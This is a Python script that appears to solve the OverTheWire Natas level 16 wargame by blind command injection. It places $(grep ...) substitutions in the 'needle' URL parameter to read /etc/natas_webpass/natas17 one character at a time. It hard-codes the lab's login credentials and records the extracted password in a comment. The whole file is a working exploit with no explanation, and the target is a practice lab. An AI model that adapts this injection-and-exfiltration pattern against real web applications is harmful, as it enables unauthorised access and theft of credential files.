import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
filtered = ''
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in chars:
	r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep '+ char + ' /etc/natas_webpass/natas17)', auth = auth)
	if 'doomed' not in r.text:
		filtered = filtered + char

passwd = ''

for i in range(32):
	for char in filtered:
		r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^'+ passwd + char + ' /etc/natas_webpass/natas17)', auth = auth)
		if 'doomed' not in r.text:
			passwd = passwd + char
			print(len(passwd), " ", passwd)

#passwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'